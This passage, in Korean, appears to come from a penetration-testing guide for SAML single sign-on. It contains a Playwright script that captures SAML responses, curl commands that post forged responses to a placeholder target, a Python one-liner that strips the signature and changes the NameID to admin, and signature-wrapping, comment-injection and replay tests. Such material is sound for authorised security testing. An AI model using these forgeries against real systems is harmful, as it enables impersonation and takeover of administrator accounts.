### Phase 2: 동적 테스트 (검증)


**테스트 사전 준비:**

Step 1: SAML Response 캡처 (Playwright 자동화)
```javascript
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: false });
  const page = await browser.newPage();

  // SAML ACS 엔드포인트로 들어오는 POST 요청을 가로챔
  let samlResponse = null;
  page.on('request', request => {
    if (request.url().includes('/acs') || request.url().includes('/saml/callback')) {
      const postData = request.postData();
      if (postData && postData.includes('SAMLResponse')) {
        const params = new URLSearchParams(postData);
        samlResponse = params.get('SAMLResponse');
        console.log('SAML Response captured (Base64):', samlResponse.substring(0, 100) + '...');
      }
    }
  });

  // SSO 로그인 시작 (SP-initiated)
  await page.goto('https://target.com/auth/saml/login');
  // IdP 로그인 페이지에서 자격 증명 입력 (사용자가 수동으로 입력하거나 자동화)
  console.log('Please complete the IdP login...');
  await page.waitForURL('**/dashboard**', { timeout: 60000 });

  if (samlResponse) {
    // Base64 디코딩하여 XML 확인
    const xml = Buffer.from(samlResponse, 'base64').toString();
    require('fs').writeFileSync('/tmp/saml_response.xml', xml);
    console.log('SAML Response saved to /tmp/saml_response.xml');
  }
  await browser.close();
})();
```

Playwright 없이 캡처하는 경우:
```
# 소스코드에서 ACS 엔드포인트 확인 후, 사용자에게 브라우저 개발자 도구의
# Network 탭에서 ACS POST 요청의 SAMLResponse 파라미터를 복사하도록 요청
```

Step 2: SAML Response 분석
```
# Base64 디코딩
echo "BASE64_SAML_RESPONSE" | base64 -d > /tmp/saml_response.xml

# 구조 확인: 서명 위치, Assertion ID, NameID, 속성값
cat /tmp/saml_response.xml
```

Step 3: SAML Response 구조 분석 (서명 위치, Assertion ID, 속성값 확인)

**서명 제거 공격 테스트:**
```
# 1. SAML Response에서 <ds:Signature> 블록 제거
# 2. Assertion 속성값 변조 (name → admin, email → admin@target.com)
# 3. Base64 인코딩 후 ACS에 전송

curl -X POST "https://target.com/acs" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=[변조된_Base64]&RelayState=/dashboard"
```

**XML 서명 래핑 공격 테스트:**
```
# 1. 변조된 Assertion (ID="_evilID", 속성: admin)을 생성
# 2. 원본 서명된 Assertion 앞에 삽입
# 3. Base64 인코딩 후 ACS에 전송

curl -X POST "https://target.com/acs" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=[래핑된_Base64]&RelayState=/dashboard"
```

**Comment Injection 테스트:**
```xml
<!-- NameID에 주석 삽입 -->
<saml:NameID>admin<!-- injected -->@evil.com</saml:NameID>
```

**Replay 테스트:**
```
# 이전에 사용된 SAML Response를 동일하게 재전송
curl -X POST "https://target.com/acs" \
  -d "SAMLResponse=[이전_Response]&RelayState=/dashboard"
```

**SAML Response 변조 스크립트:**
```
# 서명 제거 + 속성 변조 + Base64 인코딩 (Python)
python3 -c "
import base64, sys
with open('/tmp/saml_response.xml', 'r') as f:
    xml = f.read()
# ds:Signature 블록 제거
import re
xml = re.sub(r'<ds:Signature.*?</ds:Signature>', '', xml, flags=re.DOTALL)
# NameID 변조
xml = xml.replace('user@target.com', 'admin@target.com')
# Base64 인코딩
print(base64.b64encode(xml.encode()).decode())
"
```

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| 302 → 대시보드 + 세션 쿠키 발급 (변조 Response) | 확인됨 |
| 200 OK + 다른 사용자로 로그인됨 | 확인됨 |
| Replay 시 유효 (이전 Response 재사용 성공) | 확인됨 (Replay) |
| `Signature validation failed` / `invalid signature` | 안전 (서명 검증 동작) |
| `Response expired` / `NotOnOrAfter` | 안전 (시간 검증 동작) |
| `InResponseTo mismatch` | 안전 (요청-응답 바인딩 동작) |
| `Duplicate assertion ID` | 안전 (Replay 방어 동작) |

**검증 기준:**
- **확인됨**: 동적 테스트로 변조된 SAML Response가 수락되어 다른 사용자로 인증된 것을 직접 확인함
